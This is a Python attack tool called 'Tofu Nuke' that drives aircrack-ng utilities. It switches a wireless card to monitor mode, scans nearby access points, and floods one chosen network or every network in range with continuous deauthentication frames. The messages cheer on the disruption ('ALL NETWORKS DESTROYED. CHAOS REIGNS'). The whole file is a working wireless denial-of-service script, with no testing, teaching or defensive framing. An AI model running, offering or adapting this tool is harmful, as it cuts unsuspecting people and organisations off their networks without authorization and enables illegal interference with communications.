from subprocess import Popen, PIPE, call
import os
import time
import sys
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from rich.panel import Panel
from rich.text import Text

# Install rich if missing: pip install rich
console = Console()

# Tofu ASCII Art Header (Red)
TOFU_ART = r"""
████████╗ ██████╗ ███████╗██╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
╚══██╔══╝██╔═══██╗██╔════╝██║   ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
   ██║   ██║   ██║█████╗  ██║   ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
   ██║   ██║   ██║██╔══╝  ╚██╗ ██╔╝    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
   ██║   ╚██████╔╝██║      ╚████╔╝     ██║ ╚████║╚██████╔╝██║  ██╗███████╗
   ╚═╝    ╚═════╝ ╚═╝       ╚═══╝      ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
""".strip()

def print_header():
    console.print(TOFU_ART, style="bold red")
    console.print("Tofu Nuke v1.0 : Continuous Deauth Chaos", style="italic cyan")

def list_interfaces():
    console.print("\n[bold]🔍 Listing Network Interfaces:[/bold]", style="yellow")
    interfaces = os.listdir('/sys/class/net/')
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Number", style="cyan")
    table.add_column("Interface", style="green")
    for i, iface in enumerate(interfaces):
        table.add_row(str(i + 1), iface)
    console.print(table)
    return interfaces

def start_monitor_mode(interface):
    console.print(f"\n[bold]⚡ Starting Monitor Mode on [green]{interface}[/green]:[/bold]")
    with console.status("[bold cyan]Killing processes...[/bold cyan]", spinner="dots"):
        call(['airmon-ng', 'check', 'kill'])
    with console.status("[bold cyan]Activating monitor mode...[/bold cyan]", spinner="dots"):
        call(['airmon-ng', 'start', interface])
    monitor_check = os.popen(f'iwconfig {interface}').read()
    if "Mode:Monitor" in monitor_check:
        console.print(f"[bold green]✓ {interface} is now in [blink]MONITOR MODE[/blink][/bold green]")
        return True
    else:
        console.print("[bold red]✗ Failed to start monitor mode.[/bold red]")
        return False

def scan_networks(interface, duration):
    console.print(f"\n[bold]📡 Scanning Networks on [green]{interface}[/green] for {duration}s:[/bold]")
    csv_file = f'scan_output_{int(time.time())}.csv'
    proc = Popen(['airodump-ng', '--write', 'scan_output', '--output-format', 'csv', interface], stdout=PIPE, stderr=PIPE)
    
    networks = []
    start_time = time.time()
    with Progress() as progress:
        task = progress.add_task("[cyan]Scanning...", total=duration)
        while not progress.finished:
            time.sleep(1)
            progress.update(task, advance=1)
            if os.path.exists('scan_output-01.csv'):
                with open('scan_output-01.csv', 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        if "BSSID" in line or len(line.strip()) == 0:
                            continue
                        parts = line.split(',')
                        if len(parts) < 14:
                            continue
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip()
                        if bssid and channel and (bssid, channel, essid) not in networks:
                            networks.append((bssid, channel, essid))
                            console.print(f"[bold yellow]🔥 NEW TARGET: [white]{essid}[/white] | BSSID: [cyan]{bssid}[/cyan] | Channel: [green]{channel}[/green][/bold yellow]")
    proc.terminate()
    return networks

def deauth_network(interface, bssid, channel, essid, continuous=False):
    panel = Panel(
        Text(f"""
        TARGET: [bold white]{essid}[/white]
        BSSID: [cyan]{bssid}[/cyan]
        CHANNEL: [green]{channel}[/green]
        MODE: [red]{'CONTINUOUS' if continuous else 'SINGLE SHOT'}[/red]
        """, justify="center"),
        title="[blink]⚡ NUKING NETWORK ⚡[/blink]",
        border_style="red",
        padding=(1, 2)
    )
    console.print(panel)
    os.system(f'iwconfig {interface} channel {channel}')
    cmd = ['aireplay-ng', '--deauth', '0', '-a', bssid, interface] if continuous else ['aireplay-ng', '--deauth', '50', '-a', bssid, interface]
    proc = Popen(cmd, stdout=PIPE, stderr=PIPE)
    
    if continuous:
        console.print("[bold red]🚀 Continuous deauth started. Press Ctrl+C to stop.[/bold red]")
        try:
            while True:
                time.sleep(1)  # Keep the script alive
        except KeyboardInterrupt:
            proc.terminate()
            console.print("\n[bold red]✗ DEAUTH STOPPED BY USER.[/bold red]")
    else:
        proc.wait()
        console.print(f"[bold green]✓ [white]{essid}[/white] [red]DESTROYED[/red][/bold green]\n")

def main():
    print_header()
    if os.geteuid() != 0:
        console.print("\n[bold red]✗ RUN AS ROOT OR DIE TRYING.[/bold red]")
        exit(1)
    
    interfaces = list_interfaces()
    try:
        choice = int(console.input("\n[bold]🎯 Select Interface (number): [/bold]")) - 1
        interface = interfaces[choice]
    except:
        console.print("[bold red]✗ INVALID CHOICE. TERMINATING.[/bold red]")
        return
    
    if not start_monitor_mode(interface):
        return
    
    networks = scan_networks(interface, 30)
    if not networks:
        console.print("[bold red]✗ NO NETWORKS FOUND. PATHETIC.[/bold red]")
        return
    
    # Ask user for deauth mode
    console.print("\n[bold]💣 Select Deauth Mode:[/bold]")
    console.print("1. [red]NUKE ALL NETWORKS[/red]")
    console.print("2. [yellow]SELECTIVE NUKE (Choose One)[/yellow]")
    mode = console.input("[bold]🎯 Enter Choice (1 or 2): [/bold]")
    
    if mode == "1":
        for bssid, channel, essid in networks:
            deauth_network(interface, bssid, channel, essid, continuous=True)
        console.print("[bold blink]🔥 ALL NETWORKS DESTROYED. CHAOS REIGNS. 🔥[/bold blink]")
    elif mode == "2":
        console.print("\n[bold]📡 Select a Network to Nuke:[/bold]")
        for i, (bssid, channel, essid) in enumerate(networks):
            console.print(f"{i + 1}. [white]{essid}[/white] | BSSID: [cyan]{bssid}[/cyan] | Channel: [green]{channel}[/green]")
        try:
            choice = int(console.input("[bold]🎯 Enter Network Number: [/bold]")) - 1
            bssid, channel, essid = networks[choice]
            deauth_network(interface, bssid, channel, essid, continuous=True)
            console.print(f"[bold blink]🔥 [white]{essid}[/white] [red]DESTROYED. MISSION ACCOMPLISHED. 🔥[/red][/bold blink]")
        except:
            console.print("[bold red]✗ INVALID CHOICE. TERMINATING.[/bold red]")
    else:
        console.print("[bold red]✗ INVALID MODE. TERMINATING.[/bold red]")

    # Restart NetworkManager
    console.print("\n[bold]🔧 Restarting NetworkManager...[/bold]")
    os.system('sudo systemctl start NetworkManager')
    console.print("[bold green]✓ NetworkManager restarted.[/bold green]")

if __name__ == "__main__":
    main()